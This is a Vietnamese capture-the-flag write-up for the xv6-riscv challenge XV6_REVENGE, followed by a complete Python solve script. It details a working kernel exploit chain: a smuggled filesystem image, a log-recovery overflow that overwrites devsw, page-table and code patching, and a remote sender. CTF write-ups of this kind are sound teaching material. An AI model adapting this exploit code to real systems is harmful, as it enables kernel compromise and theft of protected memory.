# XV6_REVENGE — HCMUS CTF 2026

**Category:** Pwnable  
**Tags:** `xv6-riscv` · `filesystem smuggling` · `kernel memory corruption` · `devsw overwrite`

---

## 1. Mô tả bài

Service cho phép upload một file, sau đó server sẽ đặt file đó thành `user/_init`, chạy `mkfs`, boot xv6 và trả serial output về cho mình. Trong phần mô tả, flag được nạp ở trang vật lý cuối của RAM, tức `0x87fff000`, và `kalloc()` sẽ không bao giờ trả về trang này nữa. Nói ngắn gọn: flag nằm trong vùng kernel/direct-map, không thể lấy bằng cách xin phát một page bình thường.

Điểm hay của bài là bề ngoài nhìn như một bài “upload ELF `_init`”, nhưng hướng khai thác thật sự lại đi qua `mkfs`: script PoC không gửi ELF trực tiếp, mà dựng một `fs.img` đã patch sẵn, rồi bọc nó bằng magic `XV6IMGv1` để `mkfs` copy thẳng image đó vào filesystem. Điều này thể hiện rất rõ trong script qua `MAGIC = b"XV6IMGv1"` và `out.write_bytes(MAGIC + struct.pack("<Q", sparse_size) + fs.read_bytes())`. 

---

## 2. Ý tưởng khai thác

Ý tưởng tổng quát của mình là chia bài thành 2 tầng.

Tầng đầu là lợi dụng hidden format của `mkfs` để nhét một `fs.img` do mình tự chuẩn bị vào hệ thống. Script build một `_init` tối giản bằng RISC-V assembly, tạo `fs.img` bằng `mkfs`, rồi patch trực tiếp image đó trước khi gửi đi. Các bước này nằm trong `build_init()`, `build_payload()` và phần wrap `XV6IMGv1`. 

Tầng hai là đánh vào log recovery của xv6. `patch_log_header()` sửa log header để `read_head()` copy quá giới hạn `log.lh.block[]`, từ đó ghi đè sang `devsw`. Script dùng đúng các hằng số kernel như `FETCHADDR`, `KVMINITHART`, `FILEWRITE_PATCH`, `FLAG_PHYS` và `DEVS_BASE_INDEX = 31`, rồi đặt lại các slot trong `devsw` sao cho:

- `devsw[1].read  = consoleread`
- `devsw[1].write = consolewrite`
- `devsw[8].write = fetchaddr`
- `devsw[9].write = kvminithart`

Cách patch này nằm ngay trong `patch_log_header()`. 

---

## 3. Bug chính

Bug chính nằm ở phần recover log của kernel: số lượng block trong log header được tin tưởng hoàn toàn. Vì mảng `log.lh.block[]` có kích thước cố định, nhưng kernel lại copy theo `n` lấy từ disk, nên chỉ cần đặt `n` đủ lớn là có thể overflow sang dữ liệu global nằm kế bên. Trong build này, offset thực sự để chạm tới `devsw` là `DEVS_BASE_INDEX = 31`, và script của mình dùng đúng offset đó. 

Chỗ dễ sai nhất là nhiều lúc rất dễ lệch một word. Nếu tính sai base index hoặc tính thiếu 1 word cuối, con trỏ hàm sẽ bị lệch nửa vời: nhìn log recovery vẫn “có vẻ đúng”, nhưng khi gọi device lại crash hoặc im lặng. Trong write-up cũ mình cũng note rõ là `devsw[9].write` cần tới `block[69:71]`, nên `n` phải là `71`, không phải `70`. 

---

## 4. Vì sao script lại patch `devsw`

Sau khi có overflow, mục tiêu không phải chiếm hẳn RIP kiểu pwn thường thấy, mà là tận dụng các function có sẵn trong kernel thành primitive.

### 4.1. `fetchaddr` thành arbitrary 8-byte kernel write

Script chọn `devsw[8].write = fetchaddr`. Lúc đó nếu user mở device `aw` và gọi `write(fd_aw, kernel_addr, 8)`, kernel sẽ đi vào `fetchaddr(1, kernel_addr)`. Vì `fetchaddr` đọc 8 byte từ userspace address `1..8` rồi copy vào địa chỉ kernel đích, mình có được một primitive ghi 8 byte vào kernel. Đó là lý do `_init` trong script có helper `put64_at_1`, chuyên nhét qword vào VA `1..8`. 

### 4.2. `kvminithart` để flush lại page table

Script chọn tiếp `devsw[9].write = kvminithart`. Sau khi ghi đè page table của kernel, mình cần `sfence.vma` và reload `satp` để permission mới có hiệu lực. `_init` chỉ cần mở device `fl` và gọi `write(fl, 0, 0)` là kernel sẽ chạy `kvminithart()`. 

### 4.3. Patch `filewrite()` để console đọc từ kernel

Bước cuối là patch 8 byte tại `FILEWRITE_PATCH = 0x80004230`. Mục tiêu là đổi `user_src = 1` thành `user_src = 0`, để khi mình gọi `write(1, FLAG_PHYS, 128)`, `consolewrite()` sẽ coi `0x87fff000` là kernel pointer thật thay vì userspace pointer. Trong script, qword patch đó được hard-code là `0x8A9BA8B597824501`. 

---

## 5. Script PoC của mình làm gì

Write-up này dùng đúng `xv6_revenge_solve.py` làm PoC chính.

### 5.1. Build `_init`

`build_init()` ghi assembly `_init` ra file `.S`, ghi linker script `.ld`, rồi dùng `clang --target=riscv64-unknown-elf` để build ELF tối giản cho xv6. Phần assembly này làm đúng chain cần thiết:

- mở `console`, dup thành fd `0/1/2`
- in marker `S0`, `S1`
- mở `aw`, `fl`
- ghi `KERNEL_PGTBL_L2E2_RWX` vào `KERNEL_PGTBL_L2E2`
- gọi flush qua `fl`
- patch `filewrite()`
- cuối cùng `write(1, FLAG_PHYS, 128)` để in flag ra 

### 5.2. Patch root directory

`patch_root_devices()` sửa trực tiếp root directory và inode table trong `fs.img`, thêm ba device node:

- `console` major `1`
- `aw` major `8`
- `fl` major `9`

Làm vậy thì `_init` không cần gọi `mknod()` lúc runtime nữa. Chỉ cần `open()` là dùng được luôn. 

### 5.3. Patch log header

`patch_log_header()` là phần quan trọng nhất. Nó lấy superblock, xác định `logstart`, rồi ghi một log header giả với `n = 71`. Sau đó script set các entry tương ứng để ghi đè vào `devsw` bằng cách split từng function pointer 64-bit thành 2 word 32-bit liên tiếp. 

### 5.4. Wrap payload và gửi remote

`build_payload()` tạo `fs.img`, patch image, rồi bọc nó thành:

```python
MAGIC + p64(sparse_size) + fs_img_bytes
```

Cuối cùng, nếu truyền `--host` và `--port`, `send_payload()` sẽ gửi đúng format mà service yêu cầu: dòng đầu là chiều dài payload, sau đó là raw bytes. 

---

## 6. Flow khai thác

Flow exploit theo đúng script của mình là:

1. build một `_init` RISC-V rất nhỏ
2. dùng `mkfs` tạo một `fs.img` nền với `_init`
3. patch root directory để có sẵn `console`, `aw`, `fl`
4. patch log header để overflow từ `log.lh.block[]` sang `devsw`
5. wrap `fs.img` bằng `XV6IMGv1`
6. upload payload lên service
7. `mkfs` trên server import thẳng raw image của mình
8. xv6 boot, recover log, ghi đè `devsw`
9. `_init` chạy, dùng `aw` để sửa page table kernel
10. dùng `fl` để flush TLB
11. dùng `aw` patch `filewrite()`
12. gọi `write(1, 0x87fff000, 128)` để in flag

Đây cũng chính là flow mình đã ghi trong write-up cũ. 

---

## 7. Những chỗ dễ sai khi viết script

Có vài chỗ mình thấy rất dễ chết nếu không để ý.

**Thứ nhất, offset vào `devsw`.** Trong build này phải dùng `DEVS_BASE_INDEX = 31`. Sai chỗ này là mọi pointer đều lệch. Script của mình đã hard-code đúng giá trị đó. 

**Thứ hai, phải giữ console sống.** Vì exploit cần in flag ra serial, `devsw[1]` không được phá. Vì vậy script ghi đè lại `devsw[1].read` và `devsw[1].write` bằng `CONSOLEREAD` và `CONSOLEWRITE`. 

**Thứ ba, qword patch phải chính xác tuyệt đối.** Nếu 8 byte patch vào `filewrite()` sai 1–2 byte, kernel sẽ không chỉ đổi `li a0,1` thành `li a0,0`, mà còn có thể làm hỏng luôn `jalr` hoặc branch kế bên. Trong write-up cũ mình có note rõ đây là chỗ rất dễ debug nhầm. 

**Thứ tư, sau khi patch `filewrite()` thì ngữ nghĩa của `write()` sang device thay đổi.** Nói cách khác, nếu còn cố in thêm marker kiểu `S2` sau patch thì đôi lúc lại tự crash, vì buffer bị hiểu như kernel pointer. Đây là một bẫy debug khá khó chịu.

---

## 8. Hướng giải

- Lợi dụng backdoor của `mkfs` để smuggle một filesystem image
- dùng bug overflow trong log recovery để chiếm `devsw`
- dựng 2 primitive nhỏ từ các hàm kernel có sẵn:
  - `fetchaddr` cho arbitrary 8-byte write
  - `kvminithart` cho flush page table
- sau đó patch `filewrite()` để biến console thành một primitive đọc kernel memory
- đọc thẳng `FLAG_PHYS`

---

## 10. Kết luận

Bài này mình chủ yếu ghép hai lỗi lại với nhau:

1. `mkfs` có hidden importer `XV6IMGv1`, cho phép nhét raw `fs.img` thay vì một ELF bình thường.
2. Kernel có overflow trong lúc recover log, cho phép ghi đè `devsw`.

PoC script của mình bám đúng hai ý đó: build `_init`, patch filesystem, cấy helper devices, patch log header, rồi để `_init` hoàn tất phần còn lại trong lúc máy ảo boot. Đây là một chain khá gọn, và phần hay nhất là thay vì cố tìm một primitive “to”, mình chỉ ghép hai primitive nhỏ lại với nhau để cuối cùng biến console thành kernel read primitive.

```
Flag: HCMUS-CTF{don't_chee5e_my_s3tup_che3se_7he_k3rnel}
```

## Script solve
```
#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import shutil
import sys
import tempfile
from pathlib import Path

BSIZE = 1024
MAGIC = b"XV6IMGv1"
IPB = BSIZE // 64
T_DIR = 1
T_FILE = 2
T_DEVICE = 3
DINODE_FMT = "<hhhhI13I"
DIRENT_FMT = "<H14s"

# Kernel symbols / constants from the supplied kernel.
FETCHADDR = 0x80002756
KVMINITHART = 0x80000EF2
CONSOLEREAD = 0x8000016E
CONSOLEWRITE = 0x800000D0

# kalloc() returns the highest free page first, so the first kernel page-table
# page is deterministic on this challenge.
KERNEL_PGTBL_L2E2 = 0x87FFE010
KERNEL_PGTBL_L2E2_RWX = 0x000000002000000F

FILEWRITE_PATCH = 0x80004230
FILEWRITE_PATCH_QWORD = 0x8A9BA8B597824501
FLAG_PHYS = 0x87FFF000

# log.lh.block[31] aliases devsw[0].read on this exact kernel build.
DEVS_BASE_INDEX = 31


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def split64(x: int):
    return [x & 0xFFFFFFFF, (x >> 32) & 0xFFFFFFFF]


INIT_S = rf"""
.option norvc
.section .text
.globl _start
_start:
    # Open the pre-created console device and make fd 0/1/2 all point at it.
    li a7, 15                  # open
    la a0, console
    li a1, 2                   # O_RDWR
    ecall

    li a7, 10                  # dup(0) -> 1
    li a0, 0
    ecall
    li a7, 10                  # dup(0) -> 2
    li a0, 0
    ecall

    li a7, 16                  # write(1, "S0\n", 3)
    li a0, 1
    la a1, msg0
    li a2, 3
    ecall

    # Helper device 8: devsw[8].write = fetchaddr
    li a7, 15
    la a0, awdev
    li a1, 2
    ecall
    mv s1, a0

    # Helper device 9: devsw[9].write = kvminithart
    li a7, 15
    la a0, flushdev
    li a1, 2
    ecall
    mv s2, a0

    # 1) Turn the 1 GiB direct map into an RWX superpage.
    li t0, {KERNEL_PGTBL_L2E2_RWX}
    call put64_at_1
    li a7, 16
    mv a0, s1
    li a1, {KERNEL_PGTBL_L2E2}
    li a2, 8
    ecall

    # 2) Reload satp + flush the kernel TLB on this hart.
    li a7, 16
    mv a0, s2
    li a1, 0
    li a2, 0
    ecall

    li a7, 16                  # write(1, "S1\n", 3)
    li a0, 1
    la a1, msg1
    li a2, 3
    ecall

    # 3) Patch filewrite() so device writes use user_src = 0.
    li t0, {FILEWRITE_PATCH_QWORD}
    call put64_at_1
    li a7, 16
    mv a0, s1
    li a1, {FILEWRITE_PATCH}
    li a2, 8
    ecall

    fence.i

    # 4) Patched filewrite now calls consolewrite(0, FLAG_PHYS, 128).
    li a7, 16
    li a0, 1
    li a1, {FLAG_PHYS}
    li a2, 128
    ecall

hang:
    j hang

# Store t0 little-endian into user virtual addresses 1..8.
put64_at_1:
    li t1, 1
    li t2, 8
1:
    sb t0, 0(t1)
    srli t0, t0, 8
    addi t1, t1, 1
    addi t2, t2, -1
    bnez t2, 1b
    ret

.section .rodata
msg0:     .ascii "S0\n"
msg1:     .ascii "S1\n"
console:  .asciz "console"
awdev:    .asciz "aw"
flushdev: .asciz "fl"
"""

LINKER_LD = r"""
OUTPUT_ARCH(riscv)
ENTRY(_start)
PHDRS
{
  data PT_LOAD FLAGS(6); /* PF_R | PF_W */
  text PT_LOAD FLAGS(5); /* PF_R | PF_X */
}
SECTIONS
{
  . = 0;
  .scratch : {
    BYTE(0);
    . = 0x1000;
  } :data

  . = 0x1000;
  .text : ALIGN(4) {
    *(.text*)
    *(.rodata*)
  } :text
}
"""


def run(cmd, cwd=None):
    print("[*]", " ".join(map(str, cmd)), flush=True)
    subprocess.check_call(cmd, cwd=cwd)


def build_init(out: Path):
    src = out.with_suffix(".S")
    lds = out.with_suffix(".ld")
    src.write_text(INIT_S)
    lds.write_text(LINKER_LD)

    clang = shutil.which("clang")
    if not clang:
        raise SystemExit("clang not found; run this under Linux/WSL with clang + lld installed")

    run(
        [
            clang,
            "--target=riscv64-unknown-elf",
            "-march=rv64gc",
            "-mabi=lp64",
            "-nostdlib",
            "-static",
            "-fuse-ld=lld",
            f"-Wl,-T,{lds}",
            "-Wl,--no-relax",
            str(src),
            "-o",
            str(out),
        ]
    )


def inode_off(inodestart: int, inum: int) -> int:
    blk = inodestart + inum // IPB
    return blk * BSIZE + (inum % IPB) * 64


def write_inode(img: bytearray, inodestart: int, inum: int, itype: int, major: int, minor: int, nlink: int, size: int, addrs=None):
    if addrs is None:
        addrs = [0] * 13
    off = inode_off(inodestart, inum)
    struct.pack_into(DINODE_FMT, img, off, itype, major, minor, nlink, size, *addrs)


def patch_root_devices(fs: Path):
    img = bytearray(fs.read_bytes())
    magic, size, nblocks, ninodes, nlog, logstart, inodestart, bmapstart = struct.unpack_from("<8I", img, BSIZE)
    if magic != 0x10203040:
        raise SystemExit(f"bad xv6 fs magic: {magic:#x}")

    root_off = inode_off(inodestart, 1)
    vals = list(struct.unpack_from(DINODE_FMT, img, root_off))
    root_addrs = list(vals[5:])
    rootblk = root_addrs[0]
    if rootblk == 0:
        raise SystemExit("root directory has no data block")

    entries = [(3, b"console"), (4, b"aw"), (5, b"fl")]
    for idx, (inum, name) in enumerate(entries, start=3):
        ent_off = rootblk * BSIZE + idx * 16
        struct.pack_into(DIRENT_FMT, img, ent_off, inum, name.ljust(14, b"\x00"))
    vals[4] = 6 * 16  # . .. init console aw fl
    struct.pack_into(DINODE_FMT, img, root_off, *vals)

    write_inode(img, inodestart, 3, T_DEVICE, 1, 0, 1, 0)
    write_inode(img, inodestart, 4, T_DEVICE, 8, 0, 1, 0)
    write_inode(img, inodestart, 5, T_DEVICE, 9, 0, 1, 0)

    fs.write_bytes(img)
    print("[*] injected console(1), aw(8), fl(9) device nodes", flush=True)


def patch_log_header(fs: Path):
    data = bytearray(fs.read_bytes())
    magic, size, nblocks, ninodes, nlog, logstart, inodestart, bmapstart = struct.unpack_from("<8I", data, BSIZE)
    if magic != 0x10203040:
        raise SystemExit(f"bad xv6 fs magic: {magic:#x}")
    print(f"[*] superblock: size={size} nlog={nlog} logstart={logstart}", flush=True)

    # base index is 31, and devsw[9].write needs block[69:71], so n must be 71.
    n = 71
    blocks = [0] * n
    for i in range(30):
        blocks[i] = 100 + i

    def put_ptr(major: int, slot: str, ptr: int):
        off = major * 16 + (0 if slot == "read" else 8)
        idx = DEVS_BASE_INDEX + off // 4
        lo, hi = split64(ptr)
        blocks[idx] = lo
        blocks[idx + 1] = hi
        print(f"[*] devsw[{major}].{slot} = {ptr:#x} via block[{idx}:{idx + 2}]", flush=True)

    put_ptr(1, "read", CONSOLEREAD)
    put_ptr(1, "write", CONSOLEWRITE)
    put_ptr(8, "write", FETCHADDR)
    put_ptr(9, "write", KVMINITHART)

    hdr = p32(n) + b"".join(p32(x) for x in blocks)
    off = logstart * BSIZE
    data[off : off + len(hdr)] = hdr
    fs.write_bytes(data)


def build_payload(chall: Path, out: Path):
    mkfs = chall / "mkfs"
    if not mkfs.exists():
        raise SystemExit("first argument must point to the extracted public directory containing mkfs")

    with tempfile.TemporaryDirectory() as t:
        td = Path(t)
        (td / "user").mkdir()
        init = td / "user" / "_init"
        build_init(init)

        fs = td / "fs.img"
        run([str(mkfs), str(fs), "user/_init"], cwd=td)
        patch_root_devices(fs)
        patch_log_header(fs)

        sparse_size = 0x80010000 * BSIZE
        out.write_bytes(MAGIC + struct.pack("<Q", sparse_size) + fs.read_bytes())
        print(f"[+] wrote {out} ({out.stat().st_size} bytes upload, sparse disk {sparse_size} bytes)", flush=True)


def recv_all(sock: socket.socket) -> bytes:
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def send_payload(host: str, port: int, payload: bytes):
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.settimeout(12)
        banner = sock.recv(4096)
        if banner:
            sys.stdout.buffer.write(banner)
            sys.stdout.flush()
        sock.sendall(str(len(payload)).encode() + b"\n")
        sock.sendall(payload)
        rest = recv_all(sock)
        if rest:
            sys.stdout.buffer.write(rest)
            sys.stdout.flush()


def main():
    parser = argparse.ArgumentParser(description="Build and optionally send the xv6_revenge exploit payload")
    parser.add_argument("public_dir", help="path to the extracted public directory")
    parser.add_argument("--output", default="payload.bin", help="where to save the wrapped payload")
    parser.add_argument("--host", help="remote host to attack")
    parser.add_argument("--port", type=int, help="remote port to attack")
    args = parser.parse_args()

    chall = Path(args.public_dir).resolve()
    out = Path(args.output).resolve()
    build_payload(chall, out)

    if args.host or args.port:
        if not (args.host and args.port):
            raise SystemExit("--host and --port must be provided together")
        print(f"[*] sending to {args.host}:{args.port}", flush=True)
        send_payload(args.host, args.port, out.read_bytes())


if __name__ == "__main__":
    main()

```